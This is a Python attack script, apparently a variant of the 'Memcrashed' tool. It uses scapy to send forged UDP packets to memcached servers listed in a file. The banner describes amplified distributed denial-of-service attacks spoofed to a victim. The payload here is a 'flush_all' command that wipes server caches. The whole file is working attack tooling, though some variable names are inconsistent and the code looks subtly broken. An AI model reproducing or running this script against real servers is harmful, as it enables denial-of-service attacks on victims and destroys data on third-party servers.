#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys, os, time
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager

starttime=time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        old_stdout = sys.stdout
        sys.stdout = devnull
        try:  
            yield
        finally:
            sys.stdout = old_stdout

class color:
    HEADER = '\033[0m'

logo = color.HEADER + '''

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                        Author: @037
                                        Version: 3.1

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                                      
'''
ip_array = []
powa = "1"
data = "\x00\x00\x00\x00\x00\x01\x00\x00flush_all\r\n"

def calf_pow(target,powa,data):
    
    if powa>1:
       print('[+] Sending %d forged UDP packets to: %s' % (powa, bot))
       with suppress_stdout():
            send(IP(src=target, dst='%s' % bot) / UDP(dport=11211)/Raw(load=data), count=powa)
        
    elif power==1:
         print('[+] Sending 1 forged UDP packet to: %s' % bot)
         with suppress_stdout():
              send(IP(src=target, dst='%s' % bot) / UDP(dport=11211)/Raw(load=data), count=powa)
            
       
            
    print('')
    print('[•] Task complete! Exiting Platform. Have a wonderful day.')
    

def build_bot_army():
    bot_file = open("bots.txt","r")
    for bot in bot_file:
        ip_array.append(bot)
    bot_file.close()

def main():
    build_bot_army()
    for bot in ip_array:
        try:
           calf_pow(bot,powa,data)
        except:
            pass

main()
